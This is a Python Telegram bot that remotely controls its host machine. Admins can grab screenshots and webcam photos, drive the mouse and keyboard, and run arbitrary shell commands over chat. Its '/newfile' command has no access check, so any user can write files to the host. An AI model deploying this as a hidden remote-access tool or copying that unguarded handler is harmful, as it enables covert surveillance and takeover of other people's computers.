from gtts import gTTS
from playsound import playsound
import telebot
import pyautogui
from PIL import Image, ImageDraw, ImageFont
import os
import codecs
import subprocess as sp
import cv2
import time
from functools import *
import json
import sys
jf = json.load(open('admins.json'))
def photocap():
    import cv2
    camera_port = 0
    camera = cv2.VideoCapture(camera_port)
    time.sleep(0.1)  
    return_value, image = camera.read()
    cv2.imwrite("camout.png", image)
    del(camera)
api_key = open('api','r+').read()
bot = telebot.TeleBot(api_key)
osmode = False
def is_admin(id):
    admins = jf["admins"]
    return str(id) in admins

def restrict():
    def deco_restrict(f):
        @wraps(f)
        def f_restrict(message, *args, **kwargs):
            id = message.chat.id
            if is_admin(id):
                return f(message, *args, **kwargs)
            else:
                bot.send_message(chat_id=message.chat.id, text='You have no access!')
        return f_restrict 
    return deco_restrict

@bot.message_handler(commands=['start'])
def strt(message):
    bot.reply_to(message, message.chat.id)

@bot.message_handler(commands=['ss','screenshot'])
@restrict()
def test(message):
    pyautogui.screenshot('ss.png')
    bot.send_photo(message.chat.id, open('ss.png', 'rb'))
    try:
        os.remove('ss.png')
    except:
        pass
@bot.message_handler(commands=['cam','camera'])
@restrict()
def cam(message):
    photocap()
    bot.send_photo(message.chat.id, open('camout.png', 'rb'))
    try:
        os.remove('camout.png')
    except:
        pass
@bot.message_handler(commands=['mp','mouseposition'])
@restrict()
def mp(message):
    try:
        os.remove('ss.png ssout.png')
    except:
        pass
    pyautogui.screenshot('ss.png')
    ssimage = Image.open('ss.png')
    xpos = pyautogui.position()[0]
    ypos = pyautogui.position()[1]
    draw = ImageDraw.Draw(ssimage)
    draw.rectangle((xpos, ypos, xpos + 20, ypos + 20), fill=True, outline='green', width=1)
    ssimage.save('ssout.png')
    bot.send_message(text=str(pyautogui.position()),chat_id=message.chat.id)
    bot.send_photo(message.chat.id, open('ssout.png','rb'))
    try:
        os.remove('ss.png')
        os.remove('ssout.png')
    except:
        pass
@bot.message_handler(commands=['newfile','nf'])
def newf(message):
    inp = message.text
    inplist = inp.split('\n')
    filename = inplist[1]
    code = inp.split(inplist[1])[1]
    f = open(filename,'w+')
    f.write(code)

@bot.message_handler(commands=['test','t'])
@restrict()
def test(message):
    bot.send_message(chat_id=message.chat.id,text=message)
@bot.message_handler(commands=['moveTo','moveto'])
@restrict()
def ptmove(message):
    print(message.text)
    msg = message.text
    try:
        ml = msg.split(' ')
        x = int(ml[1])
        y = int(ml[2])
        pyautogui.moveTo(x,y)
    except:
        bot.send_message(text="usage: /moveTo x y")
@bot.message_handler(commands=['move','move'])
@restrict()
def ptmove(message):
    print(message.text)
    msg = message.text
    try:
        ml = msg.split(' ')
        x = int(ml[1])
        y = int(ml[2])
        pyautogui.move(x,y)
    except:
        bot.send_message(text="usage: /move x y")
@bot.message_handler(commands=['type'])
@restrict()
def ptwrite(message):
    inpt = str(message.text).split('/type ')[1]
    pyautogui.typewrite(inpt)
@bot.message_handler(commands=['press'])
@restrict()
def ptpress(message):
    inpt = str(message.text).split('/press ')[1]
    pyautogui.press(inpt)
@bot.message_handler(commands=['titles'])
@restrict()
def getttl(message):
    if sys.platform != "linux":
        bot.send_message(text=str(pyautogui.getAllTitles()),chat_id=message.chat.id)
    else: 
        bot.send_message(text=sp.check_output('wmctrl -l',shell=True).decode('utf-8'),chat_id=message.chat.id)
@bot.message_handler(commands=['click','c'])
@restrict()
def ptclick(message):
    if message.text == "/click":
        pyautogui.click()
    else:
        tinp = message.text.split(' ')
        x = tinp[1]
        y = tinp[2]
        pyautogui.click(x,y)
@bot.message_handler(commands=['rclick','rc'])
@restrict()
def ptclick(message):
    if message.text == "/rclick":
        pyautogui.leftClick()
    else:
        tinp = message.text.split(' ')
        x = tinp[1]
        y = tinp[2]
        pyautogui.leftClick(x,y)
@bot.message_handler(commands=['talk','tts'])
@restrict()
def recaud(message):
    mytext = str(message.text).split(f"{message.text.split(' ')[0]}")[1]
    filename = f'ttss.mp3'
    language = 'en'
    myobj = gTTS(text=mytext, lang=language, slow=False)
    myobj.save(filename)
    bot.send_message(text=mytext,chat_id=message.chat.id)
    playsound(filename)
    #os.system(f'start {filename}')
    bot.send_audio(chat_id=message.chat.id, audio=open(filename, 'rb'))
@bot.message_handler(commands=['doubleclick','dc'])
@restrict()
def ptdclick(message):
    if message.text == "/doubleclick":
        pyautogui.doubleclick()
    else:
        tinp = message.text.split(' ')
        x = tinp[1]
        y = tinp[2]
        pyautogui.doubleClick(x,y)

@bot.message_handler(commands=['restart'])
def restart(message):
    bot.reply_to(message,'Restarting...')
    os.execv(sys.executable, ['python'] + sys.argv)

@bot.message_handler(commands=['os','cmd','shell'])
@restrict()
def oscmd(message):
    bot.send_message(text="Shell:",chat_id=message.chat.id)
    osmode = True
    while osmode:
        @bot.message_handler()
        @restrict()
        def oscmdmode(message):
            msg = str(message.text)
            osmode = True
            print(msg)
            if msg == "exit":
                    osmode = False
                    bot.send_message(chat_id=message.chat.id, text="Exiting Shell")
                    os.execv(sys.executable, ['python'] + sys.argv)

            if osmode:
                if not msg.startswith('/'):
                    try:
                        outpt = sp.check_output(msg,shell=True)
                        outpt = codecs.decode(outpt, 'UTF-8')
                        bot.reply_to(message=message, text=outpt)
                        print(outpt)
                    except UnicodeDecodeError:
                        outpt = sp.check_output(msg,shell=True)
                        outpt = str(outpt)
                        bot.reply_to(message=message, text=outpt)
                        print(outpt)
                else:
                    pass    
print('Bot Started')
bot.polling(non_stop=True)
